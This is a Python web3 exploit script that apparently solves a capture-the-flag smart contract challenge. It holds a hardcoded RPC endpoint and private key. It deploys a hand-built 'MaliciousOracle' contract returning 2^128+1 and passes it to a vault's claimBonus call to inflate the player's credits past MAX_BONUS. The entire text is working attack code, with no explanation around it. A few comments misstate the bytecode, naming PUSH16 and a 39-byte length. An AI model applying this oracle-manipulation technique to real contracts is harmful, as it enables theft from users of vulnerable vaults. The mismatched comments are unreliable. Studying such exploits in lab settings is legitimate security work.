from web3 import Web3
from eth_account import Account

# Connection info from info.txt
RPC_URL = "http://83.136.250.108:32017/rpc/66760345-8271-4353-84b6-091fd4245084"
WALLET_ADDR = "0x1E8CF3E051961544701E8B97A302d8B39BB6dE57"
PRIVKEY = "de67c7799d336e9c3ac04f95dde85de751a81e338752a45c84b2c49639df3aea"
SETUP_CONTRACT_ADDR = "0x9AEadEA0f3d5a278fa6150c5be04AE9931dDAD45"

# Connect to RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
print(f"Connected: {w3.is_connected()}")
print(f"Chain ID: {w3.eth.chain_id}")

# Setup account
account = Account.from_key(PRIVKEY)
print(f"Account: {account.address}")
print(f"Balance: {w3.eth.get_balance(account.address) / 10**18} ETH")

MALICIOUS_ORACLE_BYTECODE = "6080604052348015600e575f5ffd5b50609c80601a5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c806344e87f9114602a575b5f5ffd5b60406004803603810190603c91906061565b6052565b60405160599190608a565b60405180910390f35b5f600160801b6001016057565b5f5ffd5b5f81905091905056fea2646970667358221220"

# ABIs
SETUP_ABI = [
    {"inputs": [], "name": "vault", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "player", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"}
]

VAULT_ABI = [
    {"inputs": [], "name": "MAX_BONUS", "outputs": [{"type": "uint128"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"type": "address"}], "name": "credits", "outputs": [{"type": "uint256"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"type": "address", "name": "oracle"}], "name": "claimBonus", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "deposit", "outputs": [], "stateMutability": "payable", "type": "function"},
    {"inputs": [{"type": "uint256"}], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]

# Get Setup contract
setup_contract = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=SETUP_ABI)

vault_addr = setup_contract.functions.vault().call()
player = setup_contract.functions.player().call()
print(f"\nVault address: {vault_addr}")
print(f"Player address: {player}")

# Get vault contract
vault_contract = w3.eth.contract(address=vault_addr, abi=VAULT_ABI)

max_bonus = vault_contract.functions.MAX_BONUS().call()
credits_before = vault_contract.functions.credits(player).call()
print(f"MAX_BONUS: {max_bonus / 10**18} ETH")
print(f"Player credits before: {credits_before}")

# Deploy MaliciousOracle using minimal bytecode
# This bytecode implements: function adjust(address) returns (uint256) { return (1 << 128) + 1; }
print("\nDeploying MaliciousOracle contract...")

# Minimal bytecode that returns 2^128 + 1 for any call
# PUSH16 0x00000000000000010000000000000001 (this is 2^128 + 1)
# PUSH1 0x00
# MSTORE
# PUSH1 0x20
# PUSH1 0x00
# RETURN
minimal_bytecode = (
    "7f"  # PUSH32
    "00000000000000000000000000000001"  # upper 128 bits = 1
    "00000000000000000000000000000001"  # lower 128 bits = 1
    "60005260206000f3"  # MSTORE at 0, RETURN 32 bytes from 0
)

# Wrap in deploy code: PUSH size, PUSH offset, PUSH destOffset, CODECOPY, PUSH size, PUSH offset, RETURN
runtime_len = len(minimal_bytecode) // 2  # 39 bytes
deploy_bytecode = (
    f"60{runtime_len:02x}"  # PUSH1 runtime_len
    "600c"  # PUSH1 12 (offset where runtime starts)  
    "6000"  # PUSH1 0 (destOffset)
    "39"    # CODECOPY
    f"60{runtime_len:02x}"  # PUSH1 runtime_len
    "6000"  # PUSH1 0
    "f3"    # RETURN
    + minimal_bytecode
)

nonce = w3.eth.get_transaction_count(account.address)
tx = {
    "from": account.address,
    "nonce": nonce,
    "gas": 500000,
    "gasPrice": w3.eth.gas_price,
    "data": "0x" + deploy_bytecode
}

signed_tx = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
oracle_addr = receipt.contractAddress
print(f"MaliciousOracle deployed at: {oracle_addr}")
print(f"Deploy tx status: {'SUCCESS' if receipt.status == 1 else 'FAILED'}")

# Call claimBonus with our malicious oracle
print("\nCalling claimBonus with malicious oracle...")

nonce = w3.eth.get_transaction_count(account.address)
tx = vault_contract.functions.claimBonus(oracle_addr).build_transaction({
    "from": account.address,
    "nonce": nonce,
    "gas": 500000,
    "gasPrice": w3.eth.gas_price
})

signed_tx = account.sign_transaction(tx)
tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"claimBonus tx status: {'SUCCESS' if receipt.status == 1 else 'FAILED'}")

# Check result
credits_after = vault_contract.functions.credits(player).call()
print(f"\nPlayer credits after: {credits_after}")
print(f"MAX_BONUS: {max_bonus}")
print(f"Credits > MAX_BONUS: {credits_after > max_bonus}")

is_solved = setup_contract.functions.isSolved().call()
print(f"\n{'='*50}")
print(f"CHALLENGE SOLVED: {is_solved}")
print(f"{'='*50}")
